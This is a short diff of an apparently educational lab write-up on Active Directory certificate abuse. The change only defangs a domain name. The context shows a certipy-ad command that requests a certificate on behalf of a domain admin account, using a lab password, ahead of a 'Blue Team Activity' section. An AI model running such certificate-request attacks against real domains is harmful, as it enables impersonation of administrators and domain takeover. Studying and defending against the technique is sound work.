@@ -128,7 +128,7 @@ HOGWARTS\severus.snape is a domain admin user. <br>
 # certipy-ad req -u 'harry.potter@hogwarts.local' -p "Gryffindor1." -dc-ip 192.168.0.111 -ca 'hogwarts-CERT01-CA' -template 'User' -target CERT01.hogwarts.local -pfx harry.potter.pfx -on-behalf-of 'HOGWARTS\severus.snape' -debug
 ```
 
-<b>-on-behalf-of</b>        : Indicates on whose behalf the certificate is requested (Format: <b>HOGWARTS\severus.snape</b> or <b>severus.snape@hogwarts.local</b>)<br>
+<b>-on-behalf-of</b>        : Indicates on whose behalf the certificate is requested (Format: <b>HOGWARTS\severus.snape</b> or <b>severus.snape@hogwarts[.]local</b>)<br>
 
 
 ## Blue Team Activity
